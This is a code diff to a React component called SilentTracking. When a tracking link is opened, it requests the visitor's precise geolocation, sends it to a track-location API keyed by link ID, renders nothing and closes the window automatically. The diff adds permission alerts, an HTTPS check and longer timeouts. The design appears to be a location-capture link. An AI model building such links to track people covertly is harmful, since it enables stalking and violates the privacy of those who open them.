@@ -17,13 +17,23 @@ const SilentTracking = () => {
       if (locationSentRef.current) return;
       locationSentRef.current = true;
 
-      console.log("Requesting location...");
-
       if (!navigator.geolocation) {
         console.error("Geolocation not supported");
-        setTimeout(() => window.close(), 1000);
+        alert("Your device does not support location tracking.");
+        setTimeout(() => window.close(), 1500);
         return;
       }
+
+      // Check HTTPS
+      if (
+        window.location.protocol !== "https:" &&
+        window.location.hostname !== "localhost"
+      ) {
+        console.warn("⚠️ Geolocation may be blocked on non-HTTPS page.");
+        alert("Please access this link via HTTPS for location tracking.");
+      }
+
+      console.log("Requesting location...");
 
       navigator.geolocation.getCurrentPosition(
         async (position) => {
@@ -36,7 +46,6 @@ const SilentTracking = () => {
           console.log("Location obtained:", location);
 
           try {
-            // Send location via API instead of WebSocket
             const response = await fetch(
               `${API}/api/track-location/${linkId}`,
               {
@@ -65,11 +74,18 @@ const SilentTracking = () => {
         },
         (error) => {
           console.error("Geolocation error:", error);
-          setTimeout(() => window.close(), 500);
+          if (error.code === error.PERMISSION_DENIED) {
+            alert("Location permission denied. Enable it in browser settings.");
+          } else if (error.code === error.POSITION_UNAVAILABLE) {
+            alert("Unable to determine location.");
+          } else if (error.code === error.TIMEOUT) {
+            alert("Location request timed out. Try again.");
+          }
+          setTimeout(() => window.close(), 2000);
         },
         {
           enableHighAccuracy: true,
-          timeout: 10000,
+          timeout: 30000, // Increased timeout for mobile GPS
           maximumAge: 0,
         },
       );
@@ -77,8 +93,10 @@ const SilentTracking = () => {
 
     sendLocationViaAPI();
 
-    // Force close after 10 seconds
-    setTimeout(() => window.close(), 10000);
+    // Force close after 35 seconds as a backup
+    const forceCloseTimer = setTimeout(() => window.close(), 35000);
+
+    return () => clearTimeout(forceCloseTimer);
   }, [linkId]);
 
   return null;
